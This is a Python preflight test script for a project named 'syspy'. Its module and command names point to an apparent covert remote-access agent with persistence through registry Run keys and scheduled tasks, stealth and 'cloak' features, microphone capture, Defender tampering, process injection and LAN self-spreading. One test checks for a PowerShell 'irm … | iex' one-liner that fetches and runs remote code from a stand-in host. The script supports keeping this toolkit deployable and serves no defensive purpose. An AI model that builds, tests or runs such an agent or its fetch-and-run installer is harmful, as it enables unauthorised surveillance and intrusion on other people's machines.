#!/usr/bin/env python3
"""Fail fast if the tree is not installable.  Run in CI and before every deploy."""
import importlib, os, sys, tempfile, zipfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
FAILS = []

def check(name, fn):
    try:
        fn(); print(f"  OK   {name}")
    except Exception as e:
        FAILS.append(f"{name}: {e}"); print(f"  FAIL {name}: {e}")

def imports():
    for mod in ("syspy.config", "syspy.crypto", "syspy.protocol", "syspy.mqtt",
                "syspy.httpd", "syspy.ws", "syspy.guardian", "syspy.packaging",
                "syspy.agent.core", "syspy.agent.commands", "syspy.agent.persistence",
                "syspy.agent.stealth", "syspy.agent.updater", "syspy.agent.runtime",
                "syspy.agent.health", "syspy.lan.beacon", "syspy.lan.discover",
                "syspy.lan.spread", "syspy.server.api", "syspy.server.hub",
                "syspy.server.webinstall", "syspy.server.runtime_cache", "bootstrap"):
        importlib.import_module(mod)

def config_surface():
    from syspy import config as c
    for name in ("topic_up", "topic_down", "broker_order", "agent_id", "mac",
                 "subnet", "hop", "parent_id", "hostname", "os_kind",
                 "runtime_python", "IS_WINDOWS", "ROOT", "PUBLIC_URL",
                 "LAN_ENABLED", "SPREAD_ENABLED", "HOP_LIMIT", "protected"):
        assert hasattr(c, name), f"config.{name} missing"
    assert c.topic_up("x").endswith("/up/x")
    assert c.topic_down("x").endswith("/down/x")
    # In self-hosted configuration, BROKERS is empty by default unless SYSPY_BROKER is set
    assert isinstance(c.broker_order(), list)

def registry_path():
    from syspy import guardian
    for key in guardian._APPROVED_SUBKEYS:
        assert "Microsoft\\Windows\\CurrentVersion\\Explorer" in key, key

def persistence_surface():
    from syspy.agent import persistence
    for name in ("_write_shim", "_write_anchor", "_cache_kit", "_reassert_run_keys",
                 "_run_commands", "_run_command", "_shim_source", "ensure", "install", "remove", "purge"):
        assert hasattr(persistence, name), f"persistence.{name} missing"

def zip_is_complete():
    from syspy import packaging
    blob = packaging.build_zip(ROOT, extra={"deploy.json": b"{}"})
    with zipfile.ZipFile(__import__("io").BytesIO(blob)) as z:
        names = set(z.namelist())
    for need in ("agent.py", "bootstrap.py", "install/i.ps1", "install/wu.cmd", "install/wu.vbs",
                 "syspy/config.py", "deploy.json"):
        assert need in names, f"kit missing {need}"

def arg_splitter():
    from syspy.agent.commands import _split_args
    assert _split_args(r'"C:\a b\x.txt" "q r"') == [r"C:\a b\x.txt", "q r"]

def one_liner():
    from syspy.server import webinstall
    line = webinstall.one_liner("https://x.test")
    assert "irm https://x.test/wu | iex" in line
    body = webinstall.render(base="https://x.test")
    for token in ("@@BASE@@", "@@ROOM@@", "@@SALT@@", "@@PROTECT@@"):
        assert token not in body, token
    assert "py.zip" in body and "Is64BitOperatingSystem" in body

def cloud_bind():
    import controller
    import os
    os.environ["RENDER"] = "1"
    assert controller.parse_args([]).host == "0.0.0.0"
    os.environ.pop("RENDER")

def deploy_settings_win():
    import json, os, tempfile
    from syspy import config as c
    d = tempfile.mkdtemp()
    p = os.path.join(d, "deploy.json")
    with open(p, "w") as fh:
        json.dump({"salt": "aa11", "room": "r1", "pass": "p1"}, fh)
    assert c._deploy_path().endswith("deploy.json")

def keep_anchor_order():
    import pathlib
    src = pathlib.Path(ROOT, "syspy/agent/persistence.py").read_text()
    body = src[src.index("def remove("):]
    ka = body.index("if keep_anchor:")
    assert ka < body.index("guardian.remove()"), "keep_anchor after guardian.remove()"
    assert ka < body.index("DeleteValue"), "keep_anchor after DeleteValue"
    assert ka < body.index("schtasks"), "keep_anchor after schtasks"

def oneliner_parses():
    from syspy.server import webinstall
    s = webinstall.render(base="https://x.test")
    assert "param(" not in s, "top-level param() breaks iex"
    assert s.lstrip().startswith("function Install-SysPy")
    assert s.rstrip().endswith("Install-SysPy")
    assert "@@" not in s

def run_value_exists():
    import pathlib
    src = pathlib.Path(ROOT, "syspy/agent/persistence.py").read_text()
    assert "def _run_command(" in src
    assert 'wscript.exe "' in src

def pushcmd_ordering():
    import pathlib
    s = pathlib.Path(ROOT, "syspy/lan/spread.py").read_text()
    lk = s.index("def _local_kit")
    pc = s.index("push.cmd", lk)
    assert pc < s.index("return root", pc)

def controller_id_stable():
    from syspy import config as c
    assert c.controller_id() == c.controller_id()


def security_and_commands():
    from syspy import crypto
    assert hasattr(crypto, "subkey"), "crypto.subkey missing"
    k = crypto.derive_key("test")
    assert len(crypto.subkey(k, "id")) == 32
    from syspy.agent import commands
    for name in ("mic", "defender", "inject", "cloak"):
        assert name in commands.REGISTRY, f"command {name} missing"
    assert os.path.isfile(os.path.join(ROOT, "scripts", "hardening.ps1"))

for name, fn in (("security and commands", security_and_commands), ("imports", imports), ("config surface", config_surface),
                 ("guardian registry path", registry_path),
                 ("persistence surface", persistence_surface),
                 ("kit completeness", zip_is_complete),
                 ("argument splitter", arg_splitter), ("one-liner", one_liner),
                 ("cloud bind", cloud_bind),
                 ("deploy settings", deploy_settings_win),
                 ("keep_anchor order", keep_anchor_order),
                 ("one-liner parses", oneliner_parses),
                 ("run value", run_value_exists),
                 ("push.cmd order", pushcmd_ordering),
                 ("controller id", controller_id_stable)):
    check(name, fn)

print()
if FAILS:
    print(f"{len(FAILS)} FAILURE(S)"); sys.exit(1)
print("preflight OK")
